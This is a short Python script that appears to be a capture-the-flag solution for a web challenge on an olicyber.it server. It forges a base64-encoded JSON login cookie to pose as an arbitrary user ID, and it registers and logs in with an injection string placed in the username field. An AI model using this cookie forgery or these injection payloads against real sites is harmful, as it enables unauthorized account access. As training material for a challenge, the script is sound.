import requests as r
from base64 import b64decode as b64d, b64encode as b64e
from bs4 import BeautifulSoup as bs
import random
import string
import json

url = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'

def login_user(user):
    stri = '{"ID":' + user + '}'
    cookies = {
        'login': b64e(stri.encode()).decode('utf-8'),
    }
    resp = r.get(url + 'home.php', cookies=cookies)
    print(resp.text)
    return resp

#resp = login_user('18')
#print(resp.headers)


payload = "' . 'cuai' . '"
# login
resp = r.post(url + 'register.php', data={'username': payload, 'password': 'ciao', 'register': ''})
print(resp.text)
resp = r.post(url + 'index.php', data={'username': payload, 'password': 'ciao', 'login': ''})
print(resp.text)